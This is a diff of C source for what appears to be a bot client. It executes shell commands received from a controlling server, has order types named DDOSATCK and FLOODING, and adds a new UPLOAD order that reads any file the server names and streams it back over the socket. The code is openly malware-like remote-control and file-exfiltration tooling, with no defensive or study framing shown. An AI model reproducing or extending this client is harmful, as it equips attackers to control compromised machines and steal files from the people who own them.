@@ -20,7 +20,8 @@ enum OrderType get_order_enum_type(const char *buffer) {
     if (strcmp(flag, "ASKSTATE") == 0) return ASKSTATE;
     if (strcmp(flag, "DDOSATCK") == 0) return DDOSATCK;
     if (strcmp(flag, "FLOODING") == 0) return FLOODING;
-    return UNKNOWN;
+    if (strncmp(buffer, "UPLOAD", 8) == 0) return UPLOAD;
+    return UNKNOWN; // warning: unknown enum value is 5
 }
 
 // Return a buffer storing the n_last_line lines of the main.log file or all of the lines if n_last_line <= 0
@@ -70,9 +71,7 @@ char* read_client_log_file(int n_last_line) {
     return buffer;
 }
 
-int parse_and_execute_command(const char *raw_message, int sockfd) {
-    Command cmd;
-    deserialize_command((char *)raw_message, &cmd);
+int parse_and_execute_command(const Command cmd, int sockfd) {
 
     // Check if the command is a `cd` command
     if (strcmp(cmd.program, "cd") == 0) {
@@ -87,7 +86,6 @@ int parse_and_execute_command(const char *raw_message, int sockfd) {
             send_message(sockfd, "No directory specified");
         }
 
-        free_command(&cmd); // Properly free the Command structure
         return 0; // No further processing needed
     }
 
@@ -101,7 +99,6 @@ int parse_and_execute_command(const char *raw_message, int sockfd) {
             send_message(sockfd, "Error retrieving cwd");
         }
 
-        free_command(&cmd); // Properly free the Command structure
         return 0; // No further processing needed
     }
 
@@ -116,7 +113,6 @@ int parse_and_execute_command(const char *raw_message, int sockfd) {
         send_message(sockfd, "Command execution failed");
     }
 
-    free_command(&cmd); // Properly free the Command structure
     return exit_code;
 }
 
@@ -124,13 +120,81 @@ void receive_and_process_message(int sockfd) {
     char buffer[1024];
 
     // Receive the message from the server
-    if (receive_message_client(sockfd, buffer, sizeof(buffer), recv) < 0) {
+    int bytes_received = receive_message_client(sockfd, buffer, sizeof(buffer), recv);
+    if (bytes_received < 0) {
         output_log("Failed to receive message from server\n", LOG_ERROR, LOG_TO_ALL);
-        return;
+        return; // Erreur de réception
     }
 
     output_log("Done receiving, preparing to parse and execute\n", LOG_DEBUG, LOG_TO_CONSOLE);
+    Command cmd;
+    deserialize_command(buffer, &cmd);
 
-    // Parse and execute the command
-    parse_and_execute_command(buffer, sockfd);
+    switch (cmd.order_type) {
+        case COMMAND_:
+            output_log("Preparing for COMMAND_ parsing and execution\n", LOG_DEBUG, LOG_TO_CONSOLE);
+            parse_and_execute_command(cmd, sockfd);
+            break;
+        case ASKLOGS_:
+            //send_logs_to_server(sockfd);
+            break;
+        case ASKSTATE:
+            //send_state_to_server(sockfd);
+            break;
+        case DDOSATCK:
+            //launch_ddos(cmd, sockfd);
+            break;
+        case FLOODING:
+            //launch_flood(cmd, sockfd);
+            break;
+        case UPLOAD:
+            output_log("Preparing for UPLOAD request\n", LOG_DEBUG, LOG_TO_CONSOLE);
+            upload_file_to_server(cmd.params[0], sockfd);
+            break;
+        case UNKNOWN:
+            output_log("Unknown command type received\n", LOG_WARNING, LOG_TO_CONSOLE);
+            break;
+    }
+
+    free_command(&cmd); // Nettoyer correctement après
+    return ;
 }
+
+
+void upload_file_to_server(const char *filename, int sockfd) {
+    FILE *fp = fopen(filename, "rb");
+    if (!fp) {
+        send_message(sockfd, "ERROR: File not found");
+        return;
+    }
+
+    // Envoie du nom de fichier
+    char header[1024];
+    snprintf(header, sizeof(header), "UPLOAD%s", filename);
+    if (send(sockfd, header, strlen(header), 0) < 0) {
+        output_log("upload_file_to_server : Error sending file data header",LOG_INFO, LOG_TO_ALL, filename);
+        fclose(fp);
+        return;
+    }
+    usleep(100000); // petite pause pour éviter que le header soit collé au reste
+
+    // Envoie des données en chunks de taille 4096
+    char buffer[FILE_CHUNK_SIZE];
+    size_t bytes_read;
+    while ((bytes_read = fread(buffer, 1, FILE_CHUNK_SIZE, fp)) > 0) { //boubler jusqu'à EOF
+        if (send(sockfd, buffer, bytes_read, 0) < 0) {
+            output_log("upload_file_to_server : Error sending file data",LOG_INFO, LOG_TO_ALL, filename);
+            fclose(fp);
+            return;
+        }
+    }
+
+    fclose(fp);
+    if (send(sockfd, "EOF", 3, 0) < 0) { // signal de fin
+        output_log("upload_file_to_server : Error sending EOF ",LOG_INFO, LOG_TO_ALL, filename);
+        return;
+    }
+    output_log("File '%s' sent successfully\n", LOG_INFO, LOG_TO_ALL, filename);
+    return;
+}
+
